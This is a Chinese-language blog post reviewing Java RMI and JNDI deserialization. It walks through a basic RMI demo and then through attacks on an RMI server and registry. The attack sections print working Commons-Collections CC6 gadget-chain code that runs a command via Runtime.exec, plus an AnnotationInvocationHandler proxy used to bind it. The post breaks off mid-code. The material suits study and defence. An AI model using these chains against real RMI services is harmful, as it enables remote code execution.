---
title: RMI和JNDI反序列化知识点回顾 - admin-神风
url: https://www.cnblogs.com/wh4am1/p/17054410.html
source: 博客园 - admin-神风
date: 2023-01-16
fetch_date: 2025-10-04T03:59:45.615568
---

# RMI和JNDI反序列化知识点回顾 - admin-神风

* [![博客园logo](//assets.cnblogs.com/logo.svg)](https://www.cnblogs.com/ "开发者的网上家园")
* [会员](https://cnblogs.vip/)
* [众包](https://www.cnblogs.com/cmt/p/18500368)
* [新闻](https://news.cnblogs.com/)
* [博问](https://q.cnblogs.com/)
* [闪存](https://ing.cnblogs.com/)
* [赞助商](https://www.cnblogs.com/cmt/p/19081960)
* [HarmonyOS](https://harmonyos.cnblogs.com/)
* [Chat2DB](https://chat2db-ai.com/)

* ![搜索](//assets.cnblogs.com/icons/search.svg)
  ![搜索](//assets.cnblogs.com/icons/enter.svg)
  + ![搜索](//assets.cnblogs.com/icons/search.svg)

    所有博客
  + ![搜索](//assets.cnblogs.com/icons/search.svg)

    当前博客
* [![写随笔](//assets.cnblogs.com/icons/newpost.svg)](https://i.cnblogs.com/EditPosts.aspx?opt=1 "写随笔")
  [![我的博客](//assets.cnblogs.com/icons/myblog.svg)](https://passport.cnblogs.com/GetBlogApplyStatus.aspx "我的博客")
  [![短消息](//assets.cnblogs.com/icons/message.svg)](https://msg.cnblogs.com/ "短消息")
  ![简洁模式](//assets.cnblogs.com/icons/lite-mode-on.svg)

  [![用户头像](//assets.cnblogs.com/icons/avatar-default.svg)](https://home.cnblogs.com/)

  [我的博客](https://passport.cnblogs.com/GetBlogApplyStatus.aspx)
  [我的园子](https://home.cnblogs.com/)
  [账号设置](https://account.cnblogs.com/settings/account)
  [会员中心](https://vip.cnblogs.com/my)
  简洁模式 ...
  退出登录

  [注册](https://account.cnblogs.com/signup)
  登录

[![返回主页](/skins/custom/images/logo.gif)](https://www.cnblogs.com/wh4am1/)

# [admin-神风](https://www.cnblogs.com/wh4am1)

##

* [博客园](https://www.cnblogs.com/)
* [首页](https://www.cnblogs.com/wh4am1/)
* [新随笔](https://i.cnblogs.com/EditPosts.aspx?opt=1)
* [联系](https://msg.cnblogs.com/send/admin-%E7%A5%9E%E9%A3%8E)
* 订阅
* [管理](https://i.cnblogs.com/)

# [RMI和JNDI反序列化知识点回顾](https://www.cnblogs.com/wh4am1/p/17054410.html "发布于 2023-01-15 22:44")

### RMI介绍

RMI (Remote Method Invocation) 远程方法调用，就是可以使远程函数调用本地函数一样方便，因此这种设计很容易和RPC(Remote Procedure Calls)搞混。区别就在于RMI是Java中的远程方法调用，传递的是一个完整的对象，对象中又包含了需要的参数和数据。

RMI中有两个非常重要的概念，分别是Stubs(客户端存根)和Skeletons(服务端骨架)，而客户端和服务端的网络通信时通过 Stub 和 Skeleton 来实现的。

su18师傅给出的一个通信原理图如下所示：

![](https://img2023.cnblogs.com/blog/1124287/202301/1124287-20230115222029388-818629412.png)

首先创建一个Demo来测试

IHello接口，需要继承于java.rmi.Remote，同时里面的所有实例都要抛出java.rmi.RemoteException异常

```
package com.example.rmiandJndi;

import java.rmi.Remote;
import java.rmi.RemoteException;

public interface IHello extends Remote {
    String sayHello(String str) throws RemoteException;
}
```

之后就需要创建一个实现类，并实现自IHello接口

```
package com.example.rmiandJndi;

import java.rmi.RemoteException;
import java.rmi.server.UnicastRemoteObject;

public class HelloImpl implements IHello {
    protected HelloImpl() throws RemoteException {
        UnicastRemoteObject.exportObject(this, 0);
    }

    @Override
    public String sayHello(String name) {
        System.out.println(name+"+OK");
        return name;
    }
}
```

同时还需要在构造方法中调用UnicastRemoteObject.exportObject来导出远程对象，以使其可用于接收传入调用。

这里引用su18师傅的解释：

> 更通俗的来讲，这个就是一个 RMI 电话本，我们想在某个人那里获取信息时（Remote Method Invocation），我们在电话本上（Registry）通过这个人的名称 （Name）来找到这个人的电话号码（Reference），并通过这个号码找到这个人（Remote Object）。

而RMI就是用java.rmi.registry.Registry和java.rmi.Naming两个主要类来实现整个功能

java.rmi.Naming中提供了查询(lookup)、绑定(bind)、重新绑定(rebind)、接触绑定(unbind)等，来对注册中心(Registry)进行操作。

通常首先使用createRegistry方法在本地创建一个注册中心

```
package com.example.rmiandJndi;

import java.rmi.registry.LocateRegistry;

public class Registry {

    public static void main(String[] args) {
        try {
            LocateRegistry.createRegistry(1099);
            System.out.println("Server Start");
            Thread.currentThread().join();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

Server端再bind对象

```
package com.example.rmiandJndi;

import java.net.MalformedURLException;
import java.rmi.AlreadyBoundException;
import java.rmi.Naming;
import java.rmi.RemoteException;

public class RemoteServer {

    public static void main(String[] args) throws RemoteException, MalformedURLException, AlreadyBoundException, InterruptedException {
        // 创建远程对象
        IHello remoteObject = new HelloImpl();
        // 绑定
        Naming.bind("rmi://localhost:1099/Hello", remoteObject);
    }
}
```

Client端通过lookup从Registry找到对应的对象引用

```
package com.example.rmiandJndi;

import java.rmi.NotBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.util.Arrays;

public class RMIClient {

    public static void main(String[] args) throws RemoteException, NotBoundException {

        Registry registry = LocateRegistry.getRegistry("localhost", 1099);

        System.out.println(Arrays.toString(registry.list()));

        // lookup and call
        IHello stub = (IHello) registry.lookup("Hello");
        System.out.println(stub.sayHello("hi"));
    }
}
```

首先启动RegistryCenter，再运行RemoteServer进行绑定，最后RMIClient调用lookup

Server端输出：

![](https://img2023.cnblogs.com/blog/1124287/202301/1124287-20230115222331464-750773618.png)

Client端输出：

![](https://img2023.cnblogs.com/blog/1124287/202301/1124287-20230115222351360-443756139.png)

补充知识点：如果客户端在调用时，传递了一个可序列化对象，这个对象在服务端不存在，则在服务端会抛出 ClassNotFound 的异常，但是 RMI 支持动态类加载，如果设置了 java.rmi.server.codebase，则会尝试从其中的地址获取 .class 并加载及反序列化。可使用如下代码进行设置。

```
System.setProperty("java.rmi.server.codebase", "http://127.0.0.1:9999/");
```

意识到这个危害后，官方将 java.rmi.server.useCodebaseOnly 参数的默认值由false 改为了true 。在java.rmi.server.useCodebaseOnly参数配置为 true 的情况下，Java虚拟机将只信任预先配置好的 codebase，不再支持从RMI请求中获取。

所以之后的利用过程中需要完成以下两个步骤：

1. 安装并配置了SecurityManager
2. 配置 java.rmi.server.useCodebaseOnly 参数为false 例：java -Djava.rmi.server.useCodebaseOnly=false

#### 攻击RMI Server

当Server端存在一个Object参数的函数时候，可以利用这个函数直接执行反序列化

![](https://img2023.cnblogs.com/blog/1124287/202301/1124287-20230115222431407-233314203.png)

在Client端调用CC6链，即可造成远程命令执行

![](https://img2023.cnblogs.com/blog/1124287/202301/1124287-20230115222453353-870691627.png)

完整代码如下：

```
public static Object getEvilClass() throws NoSuchFieldException, IllegalAccessException{
    Transformer[] transformers = new Transformer[] {
        new ConstantTransformer(Runtime.class),
        new InvokerTransformer("getMethod", new Class[] { String.class,Class[].class }, new Object[] { "getRuntime",new Class[0] }),
        new InvokerTransformer("invoke", new Class[] { Object.class,Object[].class }, new Object[] { null, new Object[0] }),
        new InvokerTransformer("exec", new Class[] { String.class },
                               new String[] {
                                   "calc.exe" }),
    };
    ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
    Map map = new HashMap<>();
    Map lazyMap = LazyMap.decorate(map, chainedTransformer);

    //Execute gadgets
    //lazyMap.get("anything");

    TiedMapEntry tm = new TiedMapEntry(lazyMap,"all");
    //HashMap#readObject会对key调用hash方法
    HashMap expMap = new HashMap();
    expMap.put(tm,"allisok");
    lazyMap.remove("all");
    //通过反射获取transformerChain中的私有属性iTransformers并设置为realTransformers
    Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
    f.setAccessible(true);
    f.set(chainedTransformer, transformers);

    return expMap;
}
```

#### 攻击Registry

在Server端绑定服务对象的时候，传入恶意的类即可造成反序列化漏洞执行

```
public static void main(String[] args) throws RemoteException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException, InvocationTargetException, InstantiationException {

    Registry registry = LocateRegistry.getRegistry("localhost",1099);

    Class<?> c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
    Constructor<?> constructor = c.getDeclaredConstructors()[0];
    constructor.setAccessible(true);

    HashMap<String,Object> map = new HashMap<>();
    map.put("wh4am1",getEvilClass());

    InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Target.class, map);

    Remote remote = (Remote) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Remote.class}, invocationHandler);

   ...